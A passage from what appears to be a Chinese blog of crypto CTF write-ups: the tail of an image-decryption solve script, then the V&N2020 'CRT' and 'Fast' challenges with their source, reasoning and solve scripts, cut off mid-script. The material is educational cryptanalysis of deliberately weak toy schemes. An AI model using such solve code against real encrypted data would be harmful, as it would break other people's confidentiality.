class="number">5</span>, <span class="number">201</span>, <span class="number">27</span>, <span class="number">137</span>, <span class="number">69</span>, <span class="number">23</span>, <span class="number">175</span>, <span class="number">34</span>, <span class="number">156</span>, <span class="number">72</span>, <span class="number">208</span>, <span class="number">32</span>, <span class="number">195</span>, <span class="number">16</span>, <span class="number">127</span>, <span class="number">65</span>, <span class="number">207</span>, <span class="number">131</span>, <span class="number">57</span>, <span class="number">203</span>, <span class="number">7</span>, <span class="number">98</span>, <span class="number">89</span>, <span class="number">36</span>, <span class="number">65</span>, <span class="number">75</span>, <span class="number">211</span>, <span class="number">21</span>, <span class="number">45</span>, <span class="number">132</span>, <span class="number">214</span>, <span class="number">239</span>, <span class="number">102</span>, <span class="number">58</span>, <span class="number">68</span>, <span class="number">130</span>, <span class="number">97</span>, <span class="number">204</span>, <span class="number">225</span>, <span class="number">76</span>, <span class="number">152</span>, <span class="number">216</span>, <span class="number">74</span>, <span class="number">149</span>, <span class="number">79</span>, <span class="number">165</span>, <span class="number">198</span>, <span class="number">72</span>, <span class="number">150</span>, <span class="number">94</span>, <span class="number">7</span>, <span class="number">177</span>, <span class="number">46</span>, <span class="number">226</span>, <span class="number">252</span>, <span class="number">247</span>, <span class="number">79</span>, <span class="number">62</span>, <span class="number">69</span>, <span class="number">106</span>, <span class="number">60</span>, <span class="number">21</span>, <span class="number">106</span>, <span class="number">236</span>, <span class="number">47</span>, <span class="number">145</span>, <span class="number">170</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">101</span>, <span class="number">14</span>, <span class="number">152</span>, <span class="number">131</span>, <span class="number">7</span>, <span class="number">37</span>, <span class="number">15</span>, <span class="number">168</span>, <span class="number">99</span>, <span class="number">115</span>, <span class="number">27</span>, <span class="number">220</span>, <span class="number">150</span>, <span class="number">89</span>, <span class="number">82</span>, <span class="number">232</span>, <span class="number">170</span>, <span class="number">107</span>, <span class="number">221</span>, <span class="number">212</span>, <span class="number">46</span>, <span class="number">235</span>, <span class="number">129</span>, <span class="number">36</span>, <span class="number">66</span>, <span class="number">217</span>, <span class="number">222</span>, <span class="number">36</span>, <span class="number">15</span>, <span class="number">217</span>, <span class="number">192</span>, <span class="number">247</span>, <span class="number">192</span>, <span class="number">113</span>, <span class="number">230</span>, <span class="number">129</span>, <span class="number">196</span>, <span class="number">13</span>, <span class="number">247</span>, <span class="number">148</span>, <span class="number">228</span>, <span class="number">225</span>, <span class="number">86</span>, <span class="number">71</span>, <span class="number">133</span>, <span class="number">132</span>, <span class="number">238</span>, <span class="number">236</span>, <span class="number">127</span>, <span class="number">11</span>, <span class="number">83</span>, <span class="number">107</span>, <span class="number">141</span>, <span class="number">114</span>, <span class="number">150</span>, <span class="number">182</span>, <span class="number">146</span>, <span class="number">213</span>, <span class="number">250</span>, <span class="number">141</span>, <span class="number">53</span>, <span class="number">114</span>, <span class="number">16</span>, <span class="number">198</span>, <span class="number">70</span>, <span class="number">133</span>, <span class="number">17</span>, <span class="number">247</span>, <span class="number">173</span>, <span class="number">136</span>, <span class="number">73</span>, <span class="number">236</span>, <span class="number">78</span>, <span class="number">188</span>, <span class="number">150</span>, <span class="number">239</span>, <span class="number">58</span>, <span class="number">199</span>, <span class="number">136</span>, <span class="number">11</span>, <span class="number">122</span>, <span class="number">134</span>, <span class="number">77</span>, <span class="number">47</span>, <span class="number">167</span>, <span class="number">137</span>, <span class="number">188</span>, <span class="number">55</span>, <span class="number">195</span>, <span class="number">41</span>, <span class="number">49</span>, <span class="number">245</span>, <span class="number">92</span>, <span class="number">160</span>, <span class="number">213</span>, <span class="number">254</span>, <span class="number">0</span>, <span class="number">85</span>, <span class="number">205</span>, <span class="number">193</span>, <span class="number">69</span>, <span class="number">2</span>, <span class="number">140</span>, <span class="number">143</span>, <span class="number">155</span>, <span class="number">127</span>, <span class="number">236</span>, <span class="number">179</span>, <span class="number">199</span>, <span class="number">168</span>, <span class="number">35</span>, <span class="number">85</span>, <span class="number">40</span>, <span class="number">45</span>, <span class="number">174</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">round</span>(r*x*(<span class="number">3</span>-x), <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">pixel, key1, key2, x0, m, n</span>):</span></span><br><span class="line">    num = m*n//<span class="number">8</span></span><br><span class="line">    seqs = []</span><br><span class="line">    x = x0</span><br><span class="line">    bins = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        x = generate(x)</span><br><span class="line">        tmp.append(x)</span><br><span class="line">        seqs.append(<span class="built_in">int</span>(x*<span class="number">22000</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> seqs:</span><br><span class="line">        bin_x = <span class="built_in">bin</span>(x)[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(bin_x) &lt; <span class="number">16</span>:</span><br><span class="line">            bin_x = <span class="string">&#x27;0&#x27;</span>*(<span class="number">16</span>-<span class="built_in">len</span>(bin_x))+bin_x</span><br><span class="line">        bins += bin_x</span><br><span class="line">    <span class="keyword">assert</span>(<span class="built_in">len</span>(pixel) == m*n)</span><br><span class="line">    cipher = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n)]   <span class="comment"># 64个零</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            index = n*i+j</span><br><span class="line">            ch = <span class="built_in">int</span>(bins[<span class="number">2</span>*index:<span class="number">2</span>*index+<span class="number">2</span>], <span class="number">2</span>)</span><br><span class="line">            pix = pixel[index]</span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">0</span>:</span><br><span class="line">                pix = (pix ^ key1) &amp; <span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">1</span>:</span><br><span class="line">                pix = (~pix ^ key1) &amp; <span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">2</span>:</span><br><span class="line">                pix = (pix ^ key2) &amp; <span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">3</span>:</span><br><span class="line">                pix = (~pix ^ key2) &amp; <span class="number">0xff</span></span><br><span class="line">            cipher[index] = pix</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = <span class="number">24</span></span><br><span class="line">n = <span class="number">16</span></span><br><span class="line">r = <span class="number">1.2</span></span><br><span class="line">key1 = <span class="number">169</span></span><br><span class="line">key2 = <span class="number">78</span></span><br><span class="line">x0 = <span class="number">0.840264</span></span><br><span class="line">num = m*n//<span class="number">8</span></span><br><span class="line">seqs = []</span><br><span class="line">x = x0</span><br><span class="line">bins = <span class="string">&#x27;&#x27;</span></span><br><span class="line">tmp = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">    x = generate(x)</span><br><span class="line">    tmp.append(x)</span><br><span class="line">    seqs.append(<span class="built_in">int</span>(x*<span class="number">22000</span>))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> seqs:</span><br><span class="line">    bin_x  = <span class="built_in">bin</span>(x)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(bin_x) &lt; <span class="number">16</span>:</span><br><span class="line">        bin_x = <span class="string">&#x27;0&#x27;</span>*(<span class="number">16</span>-<span class="built_in">len</span>(bin_x))+bin_x</span><br><span class="line">    bins += bin_x</span><br><span class="line"><span class="built_in">print</span>(bins)</span><br><span class="line">cipher = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n)]   <span class="comment"># 256个零</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        index = n*i+j</span><br><span class="line">        ch = <span class="built_in">int</span>(bins[<span class="number">2</span>*index:<span class="number">2</span>*index+<span class="number">2</span>],<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># pix = pixel[index]</span></span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">0</span>:</span><br><span class="line">            pix = <span class="number">169</span></span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">1</span>:</span><br><span class="line">            pix = <span class="number">86</span></span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">2</span>:</span><br><span class="line">            pix = <span class="number">78</span></span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">3</span>:</span><br><span class="line">            pix = <span class="number">177</span></span><br><span class="line">        cipher[index] = pix</span><br><span class="line"></span><br><span class="line">key1 = <span class="number">169</span></span><br><span class="line">key2 = <span class="number">78</span></span><br><span class="line">bins = <span class="string">&#x27;101110110010010110111000101010111011110010011100101101100100000011000000010010101010111111101110110010010010011110011111001001001101101101000011011101100000010111100110011000000101100001000001110100001111010110001110100011001110010101101110010110101110110011010011111000101000011111100010111001110101100101010101011110111100110110110011100101011010110111100010000000010110010001100000110111001010101001110010011101101110010100011110010110111100110111010100110011101000010110111100111001111011010001010100011101111100110001110100100110000101010011100000010111100110100011000110110111111110011001101010000001101110000010111000011001111101011011011111010000010110101110111010111000011100010001100101000001011101110100101100011100010010100011100100100100010101110101010110&#x27;</span></span><br><span class="line">cipher = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n)]   <span class="comment"># 384个零</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        index = n*i+j</span><br><span class="line">        ch = <span class="built_in">int</span>(bins[<span class="number">2</span>*index:<span class="number">2</span>*index+<span class="number">2</span>], <span class="number">2</span>)</span><br><span class="line">        pix = encrypt_flagimage[index]</span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">0</span>:</span><br><span class="line">            pix = (pix ^ key1) &amp; <span class="number">0xff</span></span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">1</span>:</span><br><span class="line">            pix = (~pix ^ key1) &amp; <span class="number">0xff</span></span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">2</span>:</span><br><span class="line">            pix = (pix ^ key2) &amp; <span class="number">0xff</span></span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">3</span>:</span><br><span class="line">            pix = (~pix ^ key2) &amp; <span class="number">0xff</span></span><br><span class="line">        cipher[index] = pix</span><br><span class="line"><span class="built_in">print</span>(cipher)</span><br><span class="line">data = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> cipher])</span><br><span class="line"><span class="built_in">print</span>(hashlib.md5(data.encode()).hexdigest())</span><br></pre></td></tr></table></figure>

<p>然后算出来和队伍的另外一位师傅（另外一个组员）解出来的image有一位不一样，应该是解密的问题，现在也截止了，没办法验证了</p>
<p>最后那位师傅又搞了一遍出来和我一样了，但依旧不知道是哪里错了</p>
<p>然后赛后看WP是先把数字转字节，然后拼接起来转md5的，很怪，为什么不用题目给的方式转换呢？？？</p>
<p>耶不爽</p>
<h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><p>同样也忘记名字了</p>
<p>反正就基础的RSA攻击</p>
<p>最后把雪莱的诗md5一下就好了，太麻烦了不想写</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>不行，满打满算才做出三道，还木大木大</p>
<p>我必须变得更加饥渴</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>20200219 V&amp;N2020公开赛Crypto方向复现</title>
    <url>/posts/19a278ea/</url>
    <content><![CDATA[<blockquote>
<p>前景提要</p>
</blockquote>
<p>在签到2021TCTF时看到一篇WP，是标题所述比赛的easy_RSA，本来只是用一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python2 -m primefac -vs -m=p+<span class="number">1</span> XXXXX</span><br></pre></td></tr></table></figure>

<p>尝试分解那个迷之模数，当然以失败告终，但是在尚师傅的指导下，sage和ubuntu子系统觉醒出了更强大的组合</p>
<p>然后从这篇WP出发，尝试和组里的师傅们复现下这场比赛的Crypto部分</p>
<span id="more"></span>

<h1 id="20200219-V-amp-N2020公开赛Crypto方向复现"><a href="#20200219-V-amp-N2020公开赛Crypto方向复现" class="headerlink" title="20200219 V&amp;N2020公开赛Crypto方向复现"></a>20200219 V&amp;N2020公开赛Crypto方向复现</h1><h3 id="CRT"><a href="#CRT" class="headerlink" title="CRT"></a>CRT</h3><blockquote>
<p>题目描述</p>
</blockquote>
<p>Do you know the Chinese Remainder Theorem sometimes may not only have one solution?</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ms = [getRandomNBitInteger(<span class="number">128</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line">p = reduce(<span class="keyword">lambda</span> x, y: x*y, ms)</span><br><span class="line">x = getRandomRange(<span class="number">1</span>, p)</span><br><span class="line">cs = [x % m <span class="keyword">for</span> m <span class="keyword">in</span> ms]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span> + hashlib.sha256(<span class="built_in">str</span>(x).encode()).hexdigest() + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="keyword">assert</span>(<span class="string">&quot;4b93deeb&quot;</span> <span class="keyword">in</span> flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ms = [284461942441737992421992210219060544764, 218436209063777179204189567410606431578, 288673438109933649911276214358963643204, 239232622368515797881077917549177081575, 206264514127207567149705234795160750411, 338915547568169045185589241329271490503, 246545359356590592172327146579550739141, 219686182542160835171493232381209438048]</span></span><br><span class="line"><span class="comment"># cs = [273520784183505348818648859874365852523, 128223029008039086716133583343107528289, 5111091025406771271167772696866083419, 33462335595116820423587878784664448439, 145377705960376589843356778052388633917, 128158421725856807614557926615949143594, 230664008267846531848877293149791626711, 94549019966480959688919233343793910003]</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>解题思路</p>
</blockquote>
<p>题目很简单，但是自己饶了好多弯</p>
<p>首先，一看，这不就是构造了8个同余式吗，直接CRT一把梭；结果不对</p>
<p>然后我瞟了一眼网上的WP，看到不互素后就匆匆折返。确实忘了，中国剩余定理使用的条件是模数不互素，显然ms里的数肯定存在着相同的公因子；于是我在sage中分解了这8个数（这里写脚本我是用网上找来的CRT函数的，它会检查模数是否是互质，但其实sage里帮你自动处理了）</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210705194105634.png" alt="image-20210705194105634"></p>
<p>然后在保证模数尽可能大的原则下，写完了脚本。但结果依旧不对，并且出来的x是1006位，由题目可知x是属于$[1, 2^{1024}]$的，所以显然x是落在了$[2^{1007},2^{1024}]$这段区间。总之模数不够</p>
<p>不过，这也不是最困扰我的地方，与题目提示不同，我第一个想到的是，扩大模数，构造如下的同余方程<br>$$<br>\begin{cases}<br>x\equiv cs_1\ (mod\ ms_1)\\<br>x\equiv cs_2\ (mod\ ms_2)\\<br>\vdots\qquad \vdots \qquad\qquad \vdots\\<br>x\equiv cs_8\ (mod\ ms_8)\\<br>x\equiv cs_9\ (mod\ ms_9)<br>\end{cases}<br>$$<br>其中ms9是一个随机20位的素数，因为1007+20差不多就可以达到1024的大小</p>
<blockquote>
<p>编写脚本</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> copy</span><br><span class="line"></span><br><span class="line">ms = [<span class="number">284461942441737992421992210219060544764</span>, <span class="number">218436209063777179204189567410606431578</span>, <span class="number">288673438109933649911276214358963643204</span>, <span class="number">239232622368515797881077917549177081575</span>, <span class="number">206264514127207567149705234795160750411</span>, <span class="number">338915547568169045185589241329271490503</span>, <span class="number">246545359356590592172327146579550739141</span>, <span class="number">219686182542160835171493232381209438048</span>]</span><br><span class="line">cs = [<span class="number">273520784183505348818648859874365852523</span>, <span class="number">128223029008039086716133583343107528289</span>, <span class="number">5111091025406771271167772696866083419</span>, <span class="number">33462335595116820423587878784664448439</span>, <span class="number">145377705960376589843356778052388633917</span>, <span class="number">128158421725856807614557926615949143594</span>, <span class="number">230664008267846531848877293149791626711</span>, <span class="number">94549019966480959688919233343793910003</span>]</span><br><span class="line"></span><br><span class="line">new_ms = copy.deepcopy(ms)</span><br><span class="line">my_ms = getPrime(<span class="number">20</span>)</span><br><span class="line">new_ms.append(my_ms)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(my_ms):</span><br><span class="line">    new_cs = copy.deepcopy(cs)</span><br><span class="line">    new_cs.append(i)</span><br><span class="line">    x = crt(new_cs, new_ms)</span><br><span class="line">    flag = <span class="string">&quot;flag&#123;&quot;</span> + hashlib.sha256(<span class="built_in">str</span>(x).encode()).hexdigest() + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;4b93deeb&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>再在该文件位置打开cmd，进入子系统，打开sage，输入</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">load(&quot;脚本文件名&quot;)</span><br></pre></td></tr></table></figure>

<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210705200158602.png" alt="image-20210705200158602"></p>
<p>就直接出来了，省去了粘贴换行的一些琐碎</p>
<p><strong>还有一点需要注意，在做这道题时最困扰我的是：浅拷贝。显然上面的脚本中，你可以看到我用了深拷贝的库，因为如果换成=赋值语句，你会印象深刻；除了debug意识淡薄了，也一度怀疑是不是自己对CRT还有理解偏差的地方</strong></p>
<blockquote>
<p>其他师傅的思路</p>
</blockquote>
<p>虽然这样做也无可厚非，但是还是没有能精确get到出题人的意思；什么时候才能像尚师傅一样做出题人肚子里的小蛔虫啊（茶）</p>
<p>最直接的思路应该是，CRT解出来的其实蕴含了一系列的解，其通式可以写成<br>$$<br>{kM+\sum_{i=1}^na_it_iM_i;\ k\in\mathbb{Z} }<br>$$<br>所以只要用CRT解出来x，然后爆破k就好，因为确实比较接近，上下两种方法的复杂度是同一级别的</p>
<p>当然上述通式的M是不互素的模数的积，贴一下脚本，不愧是尚师傅</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line">ms = [<span class="number">284461942441737992421992210219060544764</span>, <span class="number">218436209063777179204189567410606431578</span>, <span class="number">288673438109933649911276214358963643204</span>, <span class="number">239232622368515797881077917549177081575</span>, <span class="number">206264514127207567149705234795160750411</span>, <span class="number">338915547568169045185589241329271490503</span>, <span class="number">246545359356590592172327146579550739141</span>, <span class="number">219686182542160835171493232381209438048</span>]</span><br><span class="line">cs = [<span class="number">273520784183505348818648859874365852523</span>, <span class="number">128223029008039086716133583343107528289</span>, <span class="number">5111091025406771271167772696866083419</span>, <span class="number">33462335595116820423587878784664448439</span>, <span class="number">145377705960376589843356778052388633917</span>, <span class="number">128158421725856807614557926615949143594</span>, <span class="number">230664008267846531848877293149791626711</span>, <span class="number">94549019966480959688919233343793910003</span>]</span><br><span class="line">p = reduce(<span class="keyword">lambda</span> xx, yy: lcm(xx, yy), ms)</span><br><span class="line"></span><br><span class="line">x = crt(cs, ms)</span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    xx = k*p + x</span><br><span class="line">    k += <span class="number">1</span></span><br><span class="line">    flag = <span class="string">&quot;flag&#123;&quot;</span> + hashlib.sha256(<span class="built_in">str</span>(xx).encode()).hexdigest() + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;4b93deeb&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h3 id="Fast"><a href="#Fast" class="headerlink" title="Fast"></a>Fast</h3><blockquote>
<p>题目描述</p>
</blockquote>
<p>This is a modified RSA scheme that once proposed at a cryptography conference to achieve faster decryption. But, there seems something wrong with it.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">N = p * q</span><br><span class="line"></span><br><span class="line">g, r1, r2 = [getRandomRange(<span class="number">1</span>, N) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">g1 = <span class="built_in">pow</span>(g, r1 * (p-<span class="number">1</span>), N)</span><br><span class="line">g2 = <span class="built_in">pow</span>(g, r2 * (q-<span class="number">1</span>), N)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">m</span>):</span></span><br><span class="line">    s1, s2 = [getRandomRange(<span class="number">1</span>, N) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line">    c1 = (m * <span class="built_in">pow</span>(g1, s1, N)) % N</span><br><span class="line">    c2 = (m * <span class="built_in">pow</span>(g2, s2, N)) % N</span><br><span class="line">    <span class="keyword">return</span> (c1, c2)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">c1, c2</span>):</span></span><br><span class="line">    xp = c1 % p</span><br><span class="line">    xq = c2 % q</span><br><span class="line">    <span class="comment"># Chinese Remainder Theorem</span></span><br><span class="line">    m = (xp*inverse(q, p)*q + xq*inverse(p, q)*p) % N</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = encrypt(bytes_to_long(flag))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># N = 18680643069610062851842282268594530254220611012409807422663284548187050713427682950720783343430650669361838067625768840896513125210105582070603021732086193955893838077699465426052925750736212977005683541174195320832791835197114668838654054444342903298662698415765898335350206380896849522280206304272801325820946987172164086644949521111058774180676742851681476123338557138770304164634321305204827406522957769478330124484710532963132900017800651579612646041955628867746525508376194147796920773364680264059390497210260540079810501777507814448518995581208169818764701641258963569599247156932381367802991222265241699715283</span></span><br><span class="line"><span class="comment"># g1 = 9143176283300810019842153344177123108612540016879643936458724056602746667157014763960725115919119704406826965726023263657276550779443988565368344040505696950820899770544814163379169539926317676679421275092688200844094929042154854719312788471536324082041360841253720783220459009201882865091829118575721525038404689868986360373373122049951274015083845966946475469982961355934516388706446794517870569063777231434618411404965077775991870069073539415961610645268985004687402050059891500490949250730689691141954694508001895390336750734542724392709744200091587065816283592253967715080611459937165344139809223328071517060208</span></span><br><span class="line"><span class="comment"># g2 = 14068322834597276347776814624877614869834816383564391664570268934537693322688875343215293618493363798985047779057952636529313879548457643220996398640913517182122425631198219387988691569709691279442005545716133131472147592456812502863851227108284027033557263611949365667779259585770738623603814004666845554284808166195201470503432803440754207350347128045893594280079379926676477680556845095378093693409219131090910168117334308781843178748431526974047817218228075136005979538773141427004682344298827618677773735288946271346252828348742296301538573408254015281232250841148556304927266143397565889649305095857756884049430</span></span><br><span class="line"><span class="comment"># c1, c2 = (3976514029543484086411168675941075541422870678409709261442618832911574665848843566949154289825219682094719766762966082440586568781997199077781276145091509192208487682443007457513002005089654365915817414921574344557570444253187757317116858499013550050579856269915915792827620535138057468531410166908365364129001407147467636145589396570815405571923148902993581000542566387654639930651683044853608873583911638108204074537952317056718986683846742909366072461130053275195290631718363272923316002049685111871888148244026652658482359335651889139243735138819453744763293112267738369048641158946411500606588429007794613880534, 18524535479582837341745231233387403662294605513261199630593257391163433751052467785080620993007681605662927226603747560698627838567782891522546977611597418150309028806158429831471152782211111046118637630899456903846057977815397285171313888516791822545633820066408276065732715348834255021260666966934592884548856831383262013360819013814149529393178712576141627031723067564594282618223686778534522328204603249125537258294561872667849498796757523663858312311082034700705599706428944071848443463999351872482644584735305157234751806369172212650596041534643187402820399145288902719434158798638116870325144146218568810928344)</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>解题思路</p>
</blockquote>
<p>这是什么神仙题，n可以被分解，解密函数也是现成的，而且是正确的</p>
<p>应该是出题人有意为之吧</p>
<blockquote>
<p>编写脚本</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">c1, c2</span>):</span></span><br><span class="line">    xp = c1 % p</span><br><span class="line">    xq = c2 % q</span><br><span class="line">    <span class="comment"># Chinese Remainder Theorem</span></span><br><span class="line">    m = (xp*inverse(q, p)*q + xq*inverse(p, q)*p) % N</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">N = <span class="number">18680643069610062851842282268594530254220611012409807422663284548187050713427682950720783343430650669361838067625768840896513125210105582070603021732086193955893838077699465426052925750736212977005683541174195320832791835197114668838654054444342903298662698415765898335350206380896849522280206304272801325820946987172164086644949521111058774180676742851681476123338557138770304164634321305204827406522957769478330124484710532963132900017800651579612646041955628867746525508376194147796920773364680264059390497210260540079810501777507814448518995581208169818764701641258963569599247156932381367802991222265241699715283</span></span><br><span class="line">p = <span class="number">106417460801952098564106499070151038873024911455536068339939244771790540941720274028587207976808157868694798197258813111268537142798255715538795631061310640662123200632946626357221258957037900275496387833531601196435353735799649271157394995634449593246448856875377066127076028119584523015225013672972959211463</span></span><br><span class="line">q = <span class="number">175541146432497750706994831036579922743699110188170130349078711914372625934257198871368005366941949929286673808928975466227805723983786985788458460399280363091838402146937391317438052439989533790389951909401937742849194965413829547962616241584178560041639076246949503118700746929605640733813016659832730773141</span></span><br><span class="line">g1 = <span class="number">9143176283300810019842153344177123108612540016879643936458724056602746667157014763960725115919119704406826965726023263657276550779443988565368344040505696950820899770544814163379169539926317676679421275092688200844094929042154854719312788471536324082041360841253720783220459009201882865091829118575721525038404689868986360373373122049951274015083845966946475469982961355934516388706446794517870569063777231434618411404965077775991870069073539415961610645268985004687402050059891500490949250730689691141954694508001895390336750734542724392709744200091587065816283592253967715080611459937165344139809223328071517060208</span></span><br><span class="line">g2 = <span class="number">14068322834597276347776814624877614869834816383564391664570268934537693322688875343215293618493363798985047779057952636529313879548457643220996398640913517182122425631198219387988691569709691279442005545716133131472147592456812502863851227108284027033557263611949365667779259585770738623603814004666845554284808166195201470503432803440754207350347128045893594280079379926676477680556845095378093693409219131090910168117334308781843178748431526974047817218228075136005979538773141427004682344298827618677773735288946271346252828348742296301538573408254015281232250841148556304927266143397565889649305095857756884049430</span></span><br><span class="line">c1, c2 = (<span class="number">11823197525493679922462229312577565795790231943088967365041996969833687685138684663425736403362435947961162359880274061507909130337620672558788978473833973219147915805313662825413066312702383051828013250123487196306204170199886569869489424725349908927607008718147223533469811907589117819645863932215575433971043477313368023151369535540404625770972404614353104003800218866798610393931587791320241316614291168862653357565646094135540152539864650862797163818826669760914933822102864027625653527726320652797672561838261305835579141720874114224470663547248330428718333156518891792470511397032487663666074601934673538205109</span>, <span class="number">2779880537115408257595446644781256096238766529002829447374722026519904649762403856519534823378460053135911559335526959970225428282722454848749344880298922526768059646336181280198446021828944801139755808467391788638452557321859820238241700901109441893986616102072462317079424252804407738823379369895077334731847147033163210247117705503923134257895313179139530926252976334117657503240153146324063219900284664702824599298036943536916560758754916817002800088718757733395590409870811657828057225054151582638807129324477142895521653053887499550733193273834240174306480447726764751838123539992748222035712739618864572963930</span>)</span><br><span class="line"><span 